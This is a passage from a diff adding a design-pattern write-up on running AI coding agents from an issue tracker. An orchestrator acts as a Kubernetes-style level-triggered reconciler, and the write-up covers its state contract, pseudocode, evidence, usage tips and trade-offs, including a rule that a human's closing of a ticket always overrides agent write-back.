+**A private queue inside the orchestrator.** Now there are two systems of record. The board says `In Review`; the orchestrator's table says `running`. They drift, and the drift is invisible until someone asks why an agent is still burning tokens on a ticket that was closed yesterday. Worse, the human's natural control gesture — dragging a card — does nothing, so cancellation needs a second control surface that the team does not have open.
+
+Both failures share a root cause: dispatch is derived from *events about* the work rather than from *the state of* the work. That also leaves crash recovery as bespoke resume logic, and leaves the audit trail in agent logs no one reads instead of on the ticket everyone reads.
+
+## Solution
+
+Treat the tracker the team already operates as the **desired-state store**, and make the orchestrator a **level-triggered reconciler** over it. The orchestrator stops being a queue owner and becomes a controller that repeatedly asks "what should be running?" and closes the gap.
+
+This transplants a control-plane principle stated in the Kubernetes architecture design proposals:
+
+> "Functionality must be *level-based*, meaning the system must operate correctly given the desired state and the current/observed state, regardless of how many intermediate state updates may have been missed. Edge-triggered behavior must be just an optimization."
+
+Four components:
+
+**1. A declared state contract.** Partition the tracker's workflow states by role, in configuration rather than in code:
+
+| Role | Meaning | Written by |
+|---|---|---|
+| `active` | Dispatchable; the item wants an agent | human or agent |
+| `terminal` | A decision has been made; never dispatch | human or agent |
+| `in_progress` | Optional; set at dispatch so the board shows work started | agent |
+| `handoff` | Optional; where the item lands when a turn ends | agent |
+
+Validate the contract statically, before any run: `handoff` must not be in `active` (or the agent re-dispatches itself forever), `in_progress` must be in `active` (or the agent's own write removes the item from its work set), and the sets must not overlap. These are cheap checks that catch a whole class of runaway loops at config-load time.
+
+**2. A reconcile tick.** On a fixed interval: list items whose state is in `active` and not in `terminal`, subtract those already running, apply concurrency caps, and dispatch the remainder. The tick recomputes the whole desired set from scratch; it never consumes a delta.
+
+**3. A claim lease, held locally and treated as disposable.** The reconciler keeps an in-memory claim per item so one tick — or a concurrent worker — cannot double-dispatch. This is execution state, not truth: it is rebuilt by observation after a restart, and losing it costs at most one duplicate-suppression window, never a lost work item.
+
+**4. Write-back as the progress report.** The agent transitions the item (`in_progress` on dispatch, `handoff` when a turn ends) and posts artifacts — branch, pull request URL, failure reason — as comments. The audit trail accumulates where the team already looks.
+
+Persist locally only what cannot be re-derived from the tracker: the retry schedule and completed-run history. The work queue itself is never persisted, because it is a *view* of the board.
+
+```mermaid
+graph TD
+    T[Issue tracker: workflow states = desired state] -->|list items in active states| R[Reconcile tick]
+    R -->|diff vs observed| D[Dispatch within concurrency caps]
+    D --> C[Claim lease: ephemeral, local]
+    D --> A[Agent session]
+    A -->|in_progress / handoff transition, PR link| T
+    A -->|retry schedule, run history| S[(Local store: derived, not truth)]
+    S -.->|rebuilt on restart| R
+    H[Human moves a card] --> T
+```
+
+The decisive property is what happens on the paths nobody designs for. An orchestrator killed mid-run recovers at the next tick, because the ticket is still sitting in an active state and reconciliation is not resumption — it is the normal path. A human dragging a card out of an active state stops dispatch with no approval UI, because a human transition and an agent transition are literally the same operation. And a missed webhook costs one poll interval instead of one silently dropped task.
+
+One ordering rule makes write-back safe: **an observed terminal state always wins over a pending write-back.** If a human closes the ticket while a turn is finishing, the agent must suppress its `handoff` transition rather than reopen the item. Overwriting a terminal state undoes a decision a person already made.
+
+```pseudo
+every poll_interval:
+  validate(state_contract)        # on failure: skip dispatch, keep serving
+  reconcile(running)              # drop finished; cancel items no longer active
+  candidates = tracker.list(state in active) - terminal - running - claimed
+  for item in prioritize(candidates):
+    if slots_available(item.state):
+      claim(item)                 # local, ephemeral, rebuildable
+      dispatch(item)              # transitions to in_progress as its first step
+
+on turn_end(item):
+  latest = tracker.get(item.id)   # re-read; do not trust the dispatch snapshot
+  if latest.state in terminal:  release(item)   # human decided; do not overwrite
+  elif handoff configured:      tracker.transition(item, handoff)
+  else:                         schedule_recheck(item)
+```
+
+## Evidence
+
+- **Evidence Grade:** `medium`
+- **Most Valuable Findings:**
+  - The write-back half is already normative guidance for a major tracker vendor. Linear instructs agent developers: "If your agent is delegated by a human to work on an issue that is not in a `started`, `completed`, or `canceled` status type, move the issue to the first status in `started` when your agent begins work."
+  - The tracker item as the unit of agent dispatch is shipping at scale: GitHub's coding agent works from an assigned issue and "can open exactly one pull request to address each task it is assigned" — a per-item idempotency bound, which is the same constraint this pattern enforces with a claim.
+  - The level-triggered principle itself is load-bearing and long-validated in control planes outside agent systems, stated explicitly in the Kubernetes architecture design proposals and implemented by every Kubernetes controller.
+- **Unverified / Unclear:**
+  - No published longitudinal comparison of edge-triggered versus level-triggered agent dispatch (lost-task rate, duplicate rate, mean recovery time). The reliability argument here is structural, not measured.
+  - Vendor implementations above adopt the write-back half without publicly documenting whether dispatch itself is reconciled or event-driven, so they corroborate the shape rather than the whole loop.
+
+## How to use it
+
+- **Start with two sets, not four.** `active` and `terminal` alone give you self-healing dispatch. Add `in_progress` when the board needs to show that work started, and `handoff` when a finished turn should park the item somewhere a human looks.
+- **Pick the poll interval from the tracker's rate limit, not from impatience.** Reconciliation cost is one list query per tick. Keep webhooks if you have them, but wire them only as a hint that triggers an early tick — never as the sole path to dispatch. That is the "edge-triggered behavior must be just an optimization" clause, and it keeps the failure mode at *slower*, not *lost*.
+- **Make side effects idempotent by deriving them from the item ID.** Branch names, workspace paths, and comment markers keyed by ticket key mean a duplicate dispatch collides visibly instead of forking the work.
+- **Re-read before every write-back.** The state you snapshotted at dispatch is minutes or hours stale by the time a turn ends.
+- **Keep write-back to observed events, never judgments.** A useful dividing line: the reconciler may write a state that *reports something it observed* (work started, a turn ended, a pull request merged) and must not write one that *expresses an opinion about the work* (this is done, this is rejected). Enumerate the write points and keep the list short; every additional one is a way for the agent to overrule a person.
+- **Cap concurrency per state, not just globally**, so one flooded column cannot starve the rest of the board.
+- **Treat a rename of a tracker column as a production change.** The state contract is coupled to a workflow that non-engineers can edit; validate it at load and alarm when a configured state no longer exists, or dispatch will go quiet with nothing in the logs.
+
+## Trade-offs
+
+**Pros:**
+
+- **Self-healing.** Missed events, crashes, redeploys, and network partitions converge at the next tick. Recovery is the normal code path, so it is exercised constantly rather than only during incidents.
+- **Symmetric human control.** Moving a card is a first-class orchestration action. Cancellation, re-prioritization, and hand-back need no bespoke approval surface.
+- **One system of record.** No drift between a private queue and the board, and no reconciliation tooling to explain the difference.
+- **The audit trail lands where people already look.** Progress and artifacts accumulate on the ticket, not in an agent log.
+- **The orchestrator becomes replaceable.** Since durable truth is external, an instance can be killed, upgraded, or moved between hosts without draining a queue.
+
+**Cons:**
+
+- **Latency floor and quota pressure.** Dispatch is never faster than the poll interval, and every tick spends tracker API budget whether or not anything changed.
+- **The tracker becomes a hard dependency.** Its outage is your outage, its rate limit is your throughput ceiling, and its data model constrains what you can express.
+- **Write access to the team's board is real blast radius.** A buggy transition rule can mass-move tickets; scope the token and dry-run contract changes.
+- **The state contract is coupled to a human-edited workflow.** Someone renames a column and dispatch silently stops.
+- **Ticket noise.** Agents that comment on every turn degrade the ticket history for the humans who share it; budget write-backs deliberately.
+- **Terminal-wins costs some work.** An agent whose item is closed mid-turn must discard its handoff, so nearly finished work can be dropped by a human decision.
+
+## References
+
+- [Kubernetes architecture design principles](https://github.com/kubernetes/design-proposals-archive/blob/main/architecture/principles.md) — the level-based control principle this pattern transplants; "Edge-triggered behavior must be just an optimization"
+- [Kubernetes controllers](https://kubernetes.io/docs/concepts/architecture/controller/) — the reconciliation loop in its original setting: "controllers are control loops that watch the state of your cluster, then make or request changes where needed"
+- [Linear — agent interaction best practices](https://linear.app/developers/agent-best-practices) — vendor guidance instructing agents to move a delegated issue into a started status; independent confirmation of the write-back half
+- [GitHub Copilot coding agent](https://docs.github.com/en/copilot/concepts/agents/coding-agent/about-coding-agent) — the tracker item as the unit of dispatch, with a one-pull-request-per-task idempotency bound
+- [Sortie](https://github.com/sortie-ai/sortie) (Apache-2.0) — open-source implementation of the full loop; the state contract and its validation rules are specified in [configuration](https://github.com/sortie-ai/sortie/blob/main/docs/architecture/06-configuration-specification.md), the claim lease and terminal-wins ordering in [the orchestration state machine](https://github.com/sortie-ai/sortie/blob/main/docs/architecture/07-orchestration-state-machine.md), and the tick in [polling and reconciliation](https://github.com/sortie-ai/sortie/blob/main/docs/architecture/08-polling-scheduling-and-reconciliation.md). Disclosure: I am a maintainer.
 
 ---
 
